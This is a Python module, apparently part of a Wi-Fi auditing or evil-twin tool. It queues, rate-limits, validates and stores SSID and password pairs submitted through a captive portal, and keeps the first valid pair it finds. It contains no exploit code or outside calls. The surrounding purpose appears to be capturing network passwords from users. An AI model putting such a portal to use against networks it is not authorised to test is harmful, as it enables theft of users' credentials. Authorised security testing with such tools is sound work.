#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Credential submission handler for captive portal.

Handles credential submissions, validation queueing, and response management.
"""

import time
import threading
from typing import Optional, Callable, Dict, List, Tuple
from queue import Queue, Empty, Full
from dataclasses import dataclass

from ...util.logger import log_info, log_error, log_warning, log_debug


@dataclass
class CredentialSubmission:
    """Represents a credential submission from a client."""
    ssid: str
    password: str
    client_ip: str
    timestamp: float
    submission_id: int
    
    def __str__(self):
        return f'Submission #{self.submission_id} from {self.client_ip}: {self.ssid}'


@dataclass
class ValidationResult:
    """Represents the result of credential validation."""
    submission: CredentialSubmission
    is_valid: bool
    validation_time: float
    error_message: Optional[str] = None
    
    def __str__(self):
        status = 'VALID' if self.is_valid else 'INVALID'
        return f'{status}: {self.submission}'


class CredentialHandler:
    """
    Handles credential submissions and validation queueing.
    
    Manages the flow of credentials from submission to validation,
    tracks attempts, and provides statistics.
    """
    
    def __init__(self, max_queue_size=100):
        """
        Initialize credential handler.
        
        Args:
            max_queue_size: Maximum number of submissions to queue
        """
        self.max_queue_size = max_queue_size
        
        # Submission tracking
        self.submission_counter = 0
        self.submission_lock = threading.Lock()
        
        # Queues
        self.validation_queue = Queue(maxsize=max_queue_size)
        self.pending_submissions = {}  # submission_id -> CredentialSubmission
        
        # Results
        self.validation_results = []  # List of ValidationResult
        self.valid_credentials = []  # List of (ssid, password) tuples
        
        # Statistics
        self.total_submissions = 0
        self.total_validations = 0
        self.successful_validations = 0
        self.failed_validations = 0
        
        # Client tracking
        self.client_attempts = {}  # client_ip -> count
        self.client_last_attempt = {}  # client_ip -> timestamp
        
        # Callbacks
        self.validation_callback = None
        self.submission_callback = None
        
        log_debug('CredentialHandler', 'Initialized')
    
    def set_validation_callback(self, callback: Callable[[str, str], bool]):
        """
        Set callback for credential validation.
        
        Args:
            callback: Function(ssid, password) -> bool
        """
        self.validation_callback = callback
        log_debug('CredentialHandler', 'Validation callback set')
    
    def set_submission_callback(self, callback: Callable[[CredentialSubmission], None]):
        """
        Set callback for new submissions.
        
        Args:
            callback: Function(submission) -> None
        """
        self.submission_callback = callback
        log_debug('CredentialHandler', 'Submission callback set')
    
    def submit_credentials(self, ssid: str, password: str, client_ip: str) -> Tuple[bool, str]:
        """
        Handle a credential submission.
        
        Args:
            ssid: Network SSID
            password: Network password
            client_ip: IP address of submitting client
            
        Returns:
            Tuple of (accepted, message)
        """
        try:
            # Validate input
            validation_error = self._validate_input(ssid, password)
            if validation_error:
                log_warning('CredentialHandler', f'Invalid input from {client_ip}: {validation_error}')
                return False, validation_error
            
            # Check rate limiting
            if not self._check_rate_limit(client_ip):
                log_warning('CredentialHandler', f'Rate limit exceeded for {client_ip}')
                return False, 'Too many attempts. Please wait before trying again.'
            
            # Create submission
            with self.submission_lock:
                self.submission_counter += 1
                submission_id = self.submission_counter
            
            submission = CredentialSubmission(
                ssid=ssid,
                password=password,
                client_ip=client_ip,
                timestamp=time.time(),
                submission_id=submission_id
            )
            
            # Update statistics
            self.total_submissions += 1
            self._update_client_attempts(client_ip)
            
            # Queue for validation
            try:
                self.validation_queue.put(submission, block=False)
                self.pending_submissions[submission_id] = submission
                
                log_info('CredentialHandler', f'Queued {submission}')
                
                # Call submission callback
                if self.submission_callback:
                    try:
                        self.submission_callback(submission)
                    except Exception as e:
                        log_error('CredentialHandler', f'Error in submission callback: {e}', e)
                
                return True, 'Credentials submitted for validation'
                
            except Full:
                log_error('CredentialHandler', 'Validation queue is full')
                return False, 'Server is busy. Please try again later.'
            
        except Exception as e:
            log_error('CredentialHandler', f'Error handling submission: {e}', e)
            return False, 'An error occurred. Please try again.'
    
    def check_and_record(self, ssid: str, password: str, client_ip: str) -> Tuple[bool, str]:
        """
        Gate a submission inline: validate input format and enforce per-client
        rate limiting, recording the attempt.

        Unlike submit_credentials(), this does NOT enqueue the submission for
        async validation — it is meant to be called synchronously from the
        portal POST path as a lightweight admission check before the real
        credential callback runs.

        Args:
            ssid: Network SSID
            password: Network password
            client_ip: IP address of submitting client

        Returns:
            Tuple of (accepted, message). When accepted is False, message
            explains why (bad input or rate limited).
        """
        validation_error = self._validate_input(ssid, password)
        if validation_error:
            log_warning('CredentialHandler', f'Invalid input from {client_ip}: {validation_error}')
            return False, validation_error

        if not self._check_rate_limit(client_ip):
            log_warning('CredentialHandler', f'Rate limit exceeded for {client_ip}')
            return False, 'Too many attempts. Please wait before trying again.'

        self.total_submissions += 1
        self._update_client_attempts(client_ip)
        return True, 'OK'

    def _validate_input(self, ssid: str, password: str) -> Optional[str]:
        """
        Validate input format.
        
        Args:
            ssid: Network SSID
            password: Network password
            
        Returns:
            Error message if invalid, None if valid
        """
        # Check SSID
        if not ssid or not ssid.strip():
            return 'SSID cannot be empty'
        
        if len(ssid) > 32:
            return 'SSID is too long (max 32 characters)'
        
        # Check password
        if not password:
            return 'Password cannot be empty'
        
        if len(password) < 8:
            return 'Password is too short (min 8 characters)'
        
        if len(password) > 63:
            return 'Password is too long (max 63 characters)'
        
        return None
    
    def _check_rate_limit(self, client_ip: str, max_attempts=5, time_window=60) -> bool:
        """
        Check if client has exceeded rate limit.
        
        Args:
            client_ip: Client IP address
            max_attempts: Maximum attempts allowed
            time_window: Time window in seconds
            
        Returns:
            True if within limit, False if exceeded
        """
        current_time = time.time()
        
        # Get last attempt time
        last_attempt = self.client_last_attempt.get(client_ip, 0)
        
        # Reset counter if outside time window
        if current_time - last_attempt > time_window:
            self.client_attempts[client_ip] = 0
        
        # Check attempt count
        attempts = self.client_attempts.get(client_ip, 0)
        
        return attempts < max_attempts
    
    def _update_client_attempts(self, client_ip: str):
        """Update client attempt tracking."""
        self.client_attempts[client_ip] = self.client_attempts.get(client_ip, 0) + 1
        self.client_last_attempt[client_ip] = time.time()
    
    def get_next_submission(self, timeout=1) -> Optional[CredentialSubmission]:
        """
        Get next submission from validation queue.
        
        Args:
            timeout: Timeout in seconds
            
        Returns:
            CredentialSubmission or None if queue is empty
        """
        try:
            submission = self.validation_queue.get(timeout=timeout)
            return submission
        except Empty:
            return None
    
    def record_validation_result(self, submission: CredentialSubmission, 
                                 is_valid: bool, validation_time: float,
                                 error_message: Optional[str] = None):
        """
        Record the result of a validation attempt.
        
        Args:
            submission: The credential submission
            is_valid: Whether credentials were valid
            validation_time: Time taken to validate
            error_message: Optional error message
        """
        result = ValidationResult(
            submission=submission,
            is_valid=is_valid,
            validation_time=validation_time,
            error_message=error_message
        )
        
        self.validation_results.append(result)
        self.total_validations += 1
        
        if is_valid:
            self.successful_validations += 1
            self.valid_credentials.append((submission.ssid, submission.password))
            log_info('CredentialHandler', f'Valid credentials: {submission.ssid}')
        else:
            self.failed_validations += 1
            log_info('CredentialHandler', f'Invalid credentials from {submission.client_ip}')
        
        # Remove from pending
        if submission.submission_id in self.pending_submissions:
            del self.pending_submissions[submission.submission_id]
    
    def has_valid_credentials(self) -> bool:
        """
        Check if any valid credentials have been found.
        
        Returns:
            True if valid credentials exist
        """
        return len(self.valid_credentials) > 0
    
    def get_valid_credentials(self) -> Optional[Tuple[str, str]]:
        """
        Get the first valid credentials found.
        
        Returns:
            Tuple of (ssid, password) or None
        """
        if self.valid_credentials:
            return self.valid_credentials[0]
        return None
    
    def get_statistics(self) -> Dict:
        """
        Get handler statistics.
        
        Returns:
            Dictionary with statistics
        """
        return {
            'total_submissions': self.total_submissions,
            'total_validations': self.total_validations,
            'successful_validations': self.successful_validations,
            'failed_validations': self.failed_validations,
            'pending_validations': self.validation_queue.qsize(),
            'unique_clients': len(self.client_attempts),
            'valid_credentials_found': len(self.valid_credentials)
        }
    
    def get_client_attempts(self, client_ip: str) -> int:
        """
        Get number of attempts from a specific client.
        
        Args:
            client_ip: Client IP address
            
        Returns:
            Number of attempts
        """
        return self.client_attempts.get(client_ip, 0)
    
    def get_all_submissions(self) -> List[CredentialSubmission]:
        """
        Get all submissions (pending and completed).
        
        Returns:
            List of CredentialSubmission objects
        """
        submissions = []
        
        # Add completed submissions from results
        for result in self.validation_results:
            submissions.append(result.submission)
        
        # Add pending submissions
        for submission in self.pending_submissions.values():
            submissions.append(submission)
        
        # Sort by timestamp
        submissions.sort(key=lambda s: s.timestamp)
        
        return submissions
    
    def get_validation_results(self) -> List[ValidationResult]:
        """
        Get all validation results.
        
        Returns:
            List of ValidationResult objects
        """
        return self.validation_results.copy()
    
    def clear_credentials(self):
        """Overwrite all stored credential data in memory to prevent leakage."""
        # Overwrite passwords in validation results
        for result in self.validation_results:
            if result.submission.password:
                result.submission.password = '\x00' * len(result.submission.password)
                result.submission.password = ''
        # Overwrite passwords in pending submissions
        for submission in self.pending_submissions.values():
            if submission.password:
                submission.password = '\x00' * len(submission.password)
                submission.password = ''
        # Overwrite valid credential tuples
        for i, (ssid, password) in enumerate(self.valid_credentials):
            self.valid_credentials[i] = (ssid, '\x00' * len(password))
        self.valid_credentials.clear()
        log_info('CredentialHandler', 'Credential data cleared from memory')

    def clear_statistics(self):
        """Clear all statistics and results."""
        self.clear_credentials()
        self.validation_results.clear()
        self.client_attempts.clear()
        self.client_last_attempt.clear()

        self.total_submissions = 0
        self.total_validations = 0
        self.successful_validations = 0
        self.failed_validations = 0

        log_info('CredentialHandler', 'Statistics cleared')

    def __str__(self):
        stats = self.get_statistics()
        return (f'CredentialHandler: {stats["total_submissions"]} submissions, '
                f'{stats["successful_validations"]} valid, '
                f'{stats["failed_validations"]} invalid')
